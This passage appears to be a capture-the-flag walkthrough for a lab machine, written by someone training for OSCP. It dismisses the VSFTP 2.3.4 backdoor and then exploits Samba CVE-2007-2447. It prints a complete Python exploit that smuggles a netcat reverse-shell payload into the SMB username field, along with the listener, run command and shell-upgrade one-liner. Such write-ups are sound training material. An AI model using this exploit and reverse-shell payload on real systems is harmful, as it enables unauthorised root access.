```

From this scan, we can determine the following:

- The version of VSFTP (2.3.4) running on port 21 is known to have a backdoor via the username field.
- The version of Samba running (3.0.20) is vulnerable to CVE-2007-2447, which allows for remote RCE.

---

## Initial Shell

### Avoiding the VSFTP rabbit hole

The backdoor trigger for VSFTP 2.3.4 works when there is a `:)` in the username field. (No, really). Once the backdoor is triggered, it should open up port 6200 for connection. This is easy enough to check, so let's try it.

We can connect to the FTP server with `ftp 10.10.10.3`. When prompted for username, enter `user:)`. Put whatever you want for the password.

We can check for new open ports with `nmap -p- 10.10.10.3`

```
Starting Nmap 7.80SVN ( https://nmap.org ) at 2020-01-08 15:28 EST
Nmap scan report for 10.10.10.3
Host is up (0.048s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd
```

As you can see, no new ports were opened up. We can safely say that the FTP port is a rabbit hole.

### Exploiting Samba

As mentioned, the version of Samba being used is vulnerable to CVE-2007-2447 (Samba usermap script). It allows for a payload of commands to be sent to the server, provided that a specific string of characters is sent in the Username field.

There is a [PoC available here](https://github.com/amriunix/CVE-2007-2447), which we will use to test and acheive RCE. While there is a Metasploit module which works just fine, I'm trying to avoid MSF solutions, since I'm training for OSCP.

We can grab the Python script, and save it to our machine as `exploit.py` with `wget https://raw.githubusercontent.com/amriunix/CVE-2007-2447/master/usermap_script.py exploit.py`.

> Make sure that you have the `pysmb` package installed on your system before running. The command `pip install pysmb` will install it for you.

Looking at the script, we can see that the `payload` variable is creating a reverse shell with `nc`, and filling in the target IP and port form the arguments given.

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-

# From : https://github.com/amriunix/cve-2007-2447
# case study : https://amriunix.com/post/cve-2007-2447-samba-usermap-script/

import sys
from smb.SMBConnection import SMBConnection

def exploit(rhost, rport, lhost, lport):
        payload = 'mkfifo /tmp/hago; nc ' + lhost + ' ' + lport + ' 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago'
        username = "/=`nohup " + payload + "`"
        conn = SMBConnection(username, "", "", "")
        try:
            conn.connect(rhost, int(rport), timeout=1)
        except:
            print '[+] Payload was sent - check netcat !'

if __name__ == '__main__':
    print('[*] CVE-2007-2447 - Samba usermap script')
    if len(sys.argv) != 5:
        print("[-] usage: python " + sys.argv[0] + " <RHOST> <RPORT> <LHOST> <LPORT>")
    else:
        print("[+] Connecting !")
        rhost = sys.argv[1]
        rport = sys.argv[2]
        lhost = sys.argv[3]
        lport = sys.argv[4]
        exploit(rhost, rport, lhost, lport)
```

If we run the script with no options, we can see that it requires 4 arguments: RHOST, RPORT, LHOST, and LPORT.

Before we run the script, we need to setup a listener to capture the shell. Run `nc -lvnp 7500` to open a listener.

All we need to do now is feed it the variables it's asking for. The final command would be `python exploit.py 10.10.10.3 139 10.10.14.16 7500` to trigger the exploit.

As you can see, the reverse shell comes back with a `root` shell.

### Get a better shell and loot!

As you can see, this isn't a very good shell. We can upgrade it though, using the command `python -c 'import pty;pty.spawn("/bin/bash")'`, which will spawn a session of `/bin/bash` for us.
